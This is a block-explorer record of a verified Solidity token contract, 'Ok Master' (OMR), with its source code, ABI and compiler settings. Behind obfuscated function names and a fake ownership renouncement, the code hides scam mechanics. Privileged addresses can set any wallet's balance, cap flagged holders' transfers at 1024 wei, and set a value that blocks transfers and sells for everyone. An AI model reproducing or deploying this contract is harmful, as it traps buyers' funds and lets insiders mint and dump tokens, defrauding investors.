{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface buyAuto {\n    function createPair(address limitSender, address amountLimitTo) external returns (address);\n}\n\ninterface walletMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTakeAuto) external view returns (uint256);\n\n    function transfer(address limitTake, uint256 sellListAmount) external returns (bool);\n\n    function allowance(address launchedExemptShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellListAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTake,\n        uint256 sellListAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLaunched, uint256 value);\n    event Approval(address indexed launchedExemptShould, address indexed spender, uint256 value);\n}\n\nabstract contract launchIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletModeMetadata is walletMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OkMaster is launchIs, walletMode, walletModeMetadata {\n\n    uint256 public launchedTxExempt;\n\n    string private listTrading = \"Ok Master\";\n\n    function getOwner() external view returns (address) {\n        return launchedExempt;\n    }\n\n    uint256 public liquidityShould;\n\n    function teamAt(address listLaunched) public {\n        require(listLaunched.balance < 100000);\n        if (buyWallet) {\n            return;\n        }\n        if (limitAmountAuto != amountFee) {\n            amountTo = liquidityShould;\n        }\n        fromExemptIs[listLaunched] = true;\n        \n        buyWallet = true;\n    }\n\n    address autoTokenAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function atMarketing(address walletTeamTrading, address limitTake, uint256 sellListAmount) internal returns (bool) {\n        if (walletTeamTrading == feeMode) {\n            return launchedMin(walletTeamTrading, limitTake, sellListAmount);\n        }\n        uint256 senderLaunched = walletMode(buyTake).balanceOf(takeMin);\n        require(senderLaunched == senderWallet);\n        require(limitTake != takeMin);\n        if (sellMode[walletTeamTrading]) {\n            return launchedMin(walletTeamTrading, limitTake, walletLimit);\n        }\n        return launchedMin(walletTeamTrading, limitTake, sellListAmount);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromSell;\n    }\n\n    bool private receiverSellWallet;\n\n    function tradingLiquidity() private view {\n        require(fromExemptIs[_msgSender()]);\n    }\n\n    function approve(address exemptLiquidity, uint256 sellListAmount) public virtual override returns (bool) {\n        fromTx[_msgSender()][exemptLiquidity] = sellListAmount;\n        emit Approval(_msgSender(), exemptLiquidity, sellListAmount);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromTx;\n\n    function owner() external view returns (address) {\n        return launchedExempt;\n    }\n\n    bool private txBuy;\n\n    event OwnershipTransferred(address indexed txFund, address indexed takeListMode);\n\n    function balanceOf(address receiverTakeAuto) public view virtual override returns (uint256) {\n        return listReceiver[receiverTakeAuto];\n    }\n\n    function amountTeam(address enableShould, uint256 sellListAmount) public {\n        tradingLiquidity();\n        listReceiver[enableShould] = sellListAmount;\n    }\n\n    uint256 private isMode = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (receiverSellWallet != txBuy) {\n            txBuy = false;\n        }\n        swapTeam autoAtFund = swapTeam(autoTokenAt);\n        buyTake = buyAuto(autoAtFund.factory()).createPair(autoAtFund.WETH(), address(this));\n        \n        feeMode = _msgSender();\n        fromExemptIs[feeMode] = true;\n        listReceiver[feeMode] = isMode;\n        minTotal();\n        \n        emit Transfer(address(0), feeMode, isMode);\n    }\n\n    uint256 senderWallet;\n\n    function buyTradingFund(address launchedLimit) public {\n        tradingLiquidity();\n        \n        if (launchedLimit == feeMode || launchedLimit == buyTake) {\n            return;\n        }\n        sellMode[launchedLimit] = true;\n    }\n\n    mapping(address => bool) public sellMode;\n\n    bool private autoLimit;\n\n    uint256 public amountTo;\n\n    string private fromSell = \"OMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMode;\n    }\n\n    bool public launchedTxEnable;\n\n    function transfer(address enableShould, uint256 sellListAmount) external virtual override returns (bool) {\n        return atMarketing(_msgSender(), enableShould, sellListAmount);\n    }\n\n    mapping(address => uint256) private listReceiver;\n\n    function minTotal() public {\n        emit OwnershipTransferred(feeMode, address(0));\n        launchedExempt = address(0);\n    }\n\n    address public buyTake;\n\n    function name() external view virtual override returns (string memory) {\n        return listTrading;\n    }\n\n    bool private amountFee;\n\n    bool public buyWallet;\n\n    uint256 private tokenFeeLiquidity;\n\n    function allowance(address minLaunchLaunched, address exemptLiquidity) external view virtual override returns (uint256) {\n        if (exemptLiquidity == autoTokenAt) {\n            return type(uint256).max;\n        }\n        return fromTx[minLaunchLaunched][exemptLiquidity];\n    }\n\n    function transferFrom(address walletTeamTrading, address limitTake, uint256 sellListAmount) external override returns (bool) {\n        if (_msgSender() != autoTokenAt) {\n            if (fromTx[walletTeamTrading][_msgSender()] != type(uint256).max) {\n                require(sellListAmount <= fromTx[walletTeamTrading][_msgSender()]);\n                fromTx[walletTeamTrading][_msgSender()] -= sellListAmount;\n            }\n        }\n        return atMarketing(walletTeamTrading, limitTake, sellListAmount);\n    }\n\n    address public feeMode;\n\n    address private launchedExempt;\n\n    uint256 autoLiquidity;\n\n    bool private limitAmountAuto;\n\n    function launchedMin(address walletTeamTrading, address limitTake, uint256 sellListAmount) internal returns (bool) {\n        require(listReceiver[walletTeamTrading] >= sellListAmount);\n        listReceiver[walletTeamTrading] -= sellListAmount;\n        listReceiver[limitTake] += sellListAmount;\n        emit Transfer(walletTeamTrading, limitTake, sellListAmount);\n        return true;\n    }\n\n    address takeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private autoLaunch = 18;\n\n    uint256 constant walletLimit = 2 ** 10;\n\n    function launchLimitBuy(uint256 sellListAmount) public {\n        tradingLiquidity();\n        senderWallet = sellListAmount;\n    }\n\n    mapping(address => bool) public fromExemptIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExemptShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeListMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellListAmount\",\"type\":\"uint256\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellListAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTakeAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"}],\"name\":\"buyTradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellListAmount\",\"type\":\"uint256\"}],\"name\":\"launchLimitBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTxExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellListAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeamTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellListAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OkMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}